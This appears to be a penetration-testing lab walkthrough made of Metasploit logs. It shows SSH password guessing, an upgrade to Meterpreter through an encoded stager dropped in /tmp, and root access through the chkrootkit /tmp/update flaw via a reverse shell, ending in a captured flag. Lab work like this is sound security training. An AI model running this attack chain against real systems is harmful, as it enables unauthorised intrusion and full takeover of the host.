- The privilege escalation techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version.
- MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 133  bytes 11668 (11.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 106  bytes 343681 (335.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.250.238.2  netmask 255.255.255.0  broadcast 192.250.238.255
        ether 02:42:c0:fa:ee:02  txqueuelen 0  (Ethernet)
        RX packets 20  bytes 1696 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a LinuxPriEsc
[*] Added workspace: LinuxPriEsc
[*] Workspace: LinuxPriEsc
msf5 > setg rhosts 192.250.238.3
rhosts => 192.250.238.3
msf5 > db_nmap -sV 192.250.238.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-08 14:32 UTC
[*] Nmap: Nmap scan report for target-1 (192.250.238.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 999 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: MAC Address: 02:42:C0:FA:EE:03 (Unknown)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.250.238.3    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set username jackie
username => jackie
msf5 auxiliary(scanner/ssh/ssh_login) > set password password
password => password
msf5 auxiliary(scanner/ssh/ssh_login) > exploit

[+] 192.250.238.3:22 - Success: 'jackie:password' ''
[*] Command shell session 1 opened (192.250.238.2:44635 -> 192.250.238.3:22) at 2023-08-08 14:34:13 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                             Connection
  --  ----  ----           -----------                             ----------
  1         shell unknown  SSH jackie:password (192.250.238.3:22)  192.250.238.2:44635 -> 192.250.238.3:22 (192.250.238.3)

msf5 auxiliary(scanner/ssh/ssh_login) >
```

```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

pwd
/home/jackie
/bin/bash -i
bash: cannot set terminal process group (5779): Inappropriate ioctl for device
bash: no job control in this shell
jackie@victim-1:~$ whoami
whoami
jackie
jackie@victim-1:~$ cat /etc/*issue
cat /etc/*issue
Ubuntu 18.04.3 LTS \n \l

jackie@victim-1:~$ uname -r
uname -r
5.4.0-152-generic
jackie@victim-1:~$ ^Z
Background session 1? [y/N]  y
msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.250.238.2:4433 
[*] Sending stage (980808 bytes) to 192.250.238.3
[*] Meterpreter session 2 opened (192.250.238.2:4433 -> 192.250.238.3:51632) at 2023-08-08 14:36:56 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towPruAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/dqKpb.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/vztDF' < '/tmp/dqKpb.b64' ; chmod +x '/tmp/vztDF' ; '/tmp/vztDF' & sleep 2 ; rm -f '/tmp/vztDF' ; rm -f '/tmp/dqKpb.b64'"
[-] Output: "[1] 6616"
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                    Connection
  --  ----  ----                   -----------                                                                    ----------
  1         shell unknown          SSH jackie:password (192.250.238.3:22)                                         192.250.238.2:44635 -> 192.250.238.3:22 (192.250.238.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.250.238.3  192.250.238.2:4433 -> 192.250.238.3:51632 (192.250.238.3)

msf5 auxiliary(scanner/ssh/ssh_login) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.250.238.3
OS           : Ubuntu 18.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > shell
Process 7030 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (5779): Inappropriate ioctl for device
bash: no job control in this shell
jackie@victim-1:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
jackie@victim-1:~$
```

```
jackie@victim-1:~$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4624   820 ?        Ss   14:20   0:00 /bin/sh -c /usr/local/bin/start.sh
root           7  0.0  0.0  55096 20720 ?        S    14:20   0:00 /usr/bin/python /usr/bin/supervisord -n
root          12  0.0  0.0  28352  2576 ?        Ss   14:20   0:00 /usr/sbin/cron
root          22  0.0  0.0  72292  3328 ?        Ss   14:20   0:00 /usr/sbin/sshd
root          30  0.0  0.0   9916  2792 ?        S    14:21   0:00 /bin/bash /bin/check-down
root        5767  0.0  0.0 101548  7052 ?        Ss   14:34   0:00 sshd: jackie [priv]
jackie      5778  0.0  0.0 103848  5468 ?        S    14:34   0:00 sshd: jackie@notty
jackie      5779  0.0  0.0  18372  3132 ?        Ss   14:34   0:00 -bash
jackie      6192  0.0  0.0  18504  3460 ?        S    14:35   0:00 /bin/bash -i
jackie      6616  0.0  0.0   1144  1024 ?        S    14:36   0:00 /tmp/vztDF
jackie      7030  0.0  0.0   4624   824 ?        S    14:37   0:00 /bin/sh
jackie      7031  0.0  0.0  18504  3472 ?        S    14:37   0:00 /bin/bash -i
root        7446  0.0  0.0   4528   816 ?        S    14:38   0:00 sleep 60
jackie      7447  0.0  0.0  34396  2888 ?        R    14:38   0:00 ps aux
jackie@victim-1:~$ cat /bin/check-down
cat /bin/check-down
#!/bin/bash
while :
do
        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
        sleep 60
done
jackie@victim-1:~$ chkrootkit --help
chkrootkit --help
Usage: /bin/chkrootkit [options] [test ...]
Options:
        -h                show this help and exit
        -V                show version information and exit
        -l                show available tests and exit
        -d                debug
        -q                quiet mode
        -x                expert mode
        -r dir            use dir as the root directory
        -p dir1:dir2:dirN path for the external commands used by chkrootkit
        -n                skip NFS mounted dirs
jackie@victim-1:~$ chkrootkit -V
chkrootkit -V
chkrootkit version 0.49
jackie@victim-1:~$ ^Z
Background channel 1? [y/N]  n
^C
Terminate channel 1? [y/N]  y
meterpreter > 
Background session 2? [y/N]  
msf5 auxiliary(scanner/ssh/ssh_login) > search chkrootkit

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation


msf5 auxiliary(scanner/ssh/ssh_login) > use exploit/unix/local/chkrootkit
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION                           yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > set session 1
session => 1
msf5 exploit(unix/local/chkrootkit) > set session 2
session => 2
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                     yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                    Connection
  --  ----  ----                   -----------                                                                    ----------
  1         shell unknown          SSH jackie:password (192.250.238.3:22)                                         192.250.238.2:44635 -> 192.250.238.3:22 (192.250.238.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.250.238.3  192.250.238.2:4433 -> 192.250.238.3:51632 (192.250.238.3)

msf5 exploit(unix/local/chkrootkit) > info

       Name: Chkrootkit Local Privilege Escalation
     Module: exploit/unix/local/chkrootkit
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 2014-06-04

Provided by:
  Thomas Stangner
  Julien "jvoisin" Voisin

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  Yes

Basic options:
  Name        Current Setting       Required  Description
  ----        ---------------       --------  -----------
  CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
  SESSION     2                     yes       The session to run this module on.

Payload information:

Description:
  Chkrootkit before 0.50 will run any executable file named 
  /tmp/update as root, allowing a trivial privilege escalation. 
  WfsDelay is set to 24h, since this is how often a chkrootkit scan is 
  scheduled by default.

References:
  https://cvedetails.com/cve/CVE-2014-0476/
  OSVDB (107710)
  https://www.exploit-db.com/exploits/33899
  http://www.securityfocus.com/bid/67813
  https://cwe.mitre.org/data/definitions/20.html
  https://seclists.org/oss-sec/2014/q2/430

msf5 exploit(unix/local/chkrootkit) > set chkrootkit /bin/chkrootkit
chkrootkit => /bin/chkrootkit
msf5 exploit(unix/local/chkrootkit) > ip a
[*] exec: ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
21743: eth0@if21744: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
21746: eth1@if21747: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:fa:ee:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.250.238.2/24 brd 192.250.238.255 scope global eth1
       valid_lft forever preferred_lft forever
msf5 exploit(unix/local/chkrootkit) > set lhost 192.250.238.2
lhost => 192.250.238.2
msf5 exploit(unix/local/chkrootkit) > exploit

[*] Started reverse TCP double handler on 10.1.0.7:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
^C[*] Exploit completed, but no session was created.
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHKROOTKIT  /bin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.7         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > set lhost eth1
lhost => eth1
msf5 exploit(unix/local/chkrootkit) > set lhost 192.250.238.2
lhost => 192.250.238.2
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHKROOTKIT  /bin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.250.238.2    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP double handler on 192.250.238.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo SYpFjetI6peGL5qY;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "SYpFjetI6peGL5qY\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (192.250.238.2:4444 -> 192.250.238.3:33958) at 2023-08-08 14:45:17 +0000
[+] Deleted /tmp/update

getuid
sh: 13: getuid: not found
pwd
/root
/bin/bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# whoami
whoami
root
root@victim-1:~# 
root@victim-1:~# ls
ls
flag
root@victim-1:~# cat flag
cat flag
9db8bf8f483ff50857f26f9bd636bed6
root@victim-1:~# 
```